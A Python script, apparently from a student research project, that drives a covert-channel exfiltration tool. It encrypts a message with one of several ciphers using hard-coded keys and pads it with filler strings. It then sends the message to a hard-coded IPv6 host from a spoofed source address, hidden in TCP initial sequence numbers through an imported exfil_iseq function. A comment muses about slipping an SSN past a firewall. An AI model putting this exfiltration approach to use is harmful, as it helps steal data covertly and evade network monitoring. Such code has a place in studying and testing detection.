
import platform

# Custom function definitions
import initialSeqFerret
import ipidFerret
import IPy
from encryption.AES import MyAES_
from encryption.base64_ import Mybase64_
from encryption.Blowfish import MyBlowfish_
from encryption.DES import MyDES_
from encryption.DES3 import MyDES3_



destination = "2001:da8:270:2021::9c"
spoof = "2001:da8:270:2021::9c"
dstport = 80
runtest = "seq"
mode = "demo"

# Validate all the user input

# Ensure we have a destination specified
# if destination == "foo":
#     parser.print_help()
#     exit(0)

try:
    IPy.IP(destination)
except ValueError:
    print("\nERROR: Invalid destination IP address\n")
    # parser.print_help()
    exit(0)

try:
    IPy.IP(spoof)
except ValueError:
    print("\nERROR: Invalid spoof source IP address\n")
    # parser.print_help()
    exit(0)

if dstport < 0 or dstport > 65535:
    print("\nERROR: Destination port number is invalid, try a number 0 to 65,535\n")
    # parser.print_help()
    exit(0)

while mode != 'demo' and mode != 'live':
    mode = input("Use a valid mode (live/demo):")


# An example sending a SSN, with the hyphens to make it look like a SSN. A
# smooth criminal may try to obfuscate the SSN.
# TEST: will a firewall detect this? should it?
#message = '111-22-3333 from ' + thishost + '\n'
# TODO: Get this input from CLI or a file

switch = input()
if switch == 'a':
    func = MyAES_('loihydquweiuytgn')
elif switch == 'b':
    func = Mybase64_()
elif switch == 'c':
    func = MyBlowfish_('axzccsd')
elif switch == 'd':
    func = MyDES_('dsaxzsd')
elif switch == 'e':
    func = MyDES3_('azxcwasd')




sent_message = input()
sent_message = func.encode(sent_message)
random_message_be = 'goz'
random_message_af = 'pjc'
mes = random_message_be+sent_message.decode('utf-8')+random_message_af
print(mes)

data = ["hello,world",
        "my name is xxx",
        "I am graduate in HNU",
        "so what do you want to know",
        "11111111",
        "22222"]
# ============
# Main program
# ============

print('[+] destination: ' + destination)

# ==== use iseq
if runtest == 'seq' or runtest == 'all':
    print('[*] Testing: initial sequence number..')
    initialSeqFerret.exfil_iseq(spoof, destination, dstport, mes, data, bounce=0)
    print('[*] Done: initial sequence number')

